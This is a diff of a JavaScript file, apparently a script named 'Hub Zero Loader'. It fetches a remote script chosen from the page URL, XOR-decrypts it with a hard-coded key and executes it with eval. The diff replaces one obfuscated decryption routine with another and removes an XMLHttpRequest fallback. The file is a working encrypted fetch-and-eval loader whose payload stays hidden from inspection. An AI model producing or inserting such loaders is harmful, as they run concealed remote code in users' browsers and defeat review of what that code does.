@@ -65,6 +65,14 @@
     return;
   }
 
+  function xorDecrypt(str, key) {
+    var result = "";
+    for (var i = 0; i < str.length; i++) {
+      result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return result;
+  }
+
   var href = window.location.href.toLowerCase();
   var scriptSrc = '';
 
@@ -77,40 +85,17 @@
     return;
   }
 
-  function decrypt(text) {
-    var keyArr = [26, 50, 51, 26, 51, 27];
-    var key = "";
-    for (var i = 0; i < keyArr.length; i++) {
-      key += String.fromCharCode(keyArr[i] ^ 42);
-    }
-    var tokens = text.trim().split('-');
-    var output = [];
-    for (var i = 0; i < tokens.length; i++) {
-      if (!tokens[i]) continue;
-      var byteVal = parseInt(tokens[i], 16);
-      var charCode = byteVal ^ key.charCodeAt(i % key.length);
-      output.push(String.fromCharCode(charCode));
-    }
-    return output.join("");
-  }
-
   if (window.fetch) {
     window.fetch(scriptSrc)
       .then(function(r) { return r.text(); })
-      .then(function(encryptedText) {
-        var code = decrypt(encryptedText);
-        eval(code);
+      .then(function(code) {
+        var decrypted = xorDecrypt(code, "089091");
+        eval(decrypted);
       })
-      .catch(function(err) { console.error('Hub Zero Loader: Failed to load script.', err); });
+      .catch(function(err) {
+        console.error('Hub Zero Loader: Failed to load script.', err);
+      });
   } else {
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", scriptSrc, true);
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4 && xhr.status === 200) {
-        var code = decrypt(xhr.responseText);
-        eval(code);
-      }
-    };
-    xhr.send();
+    alert('Hub Zero Loader: Fetch is not supported on this browser.');
   }
 })();
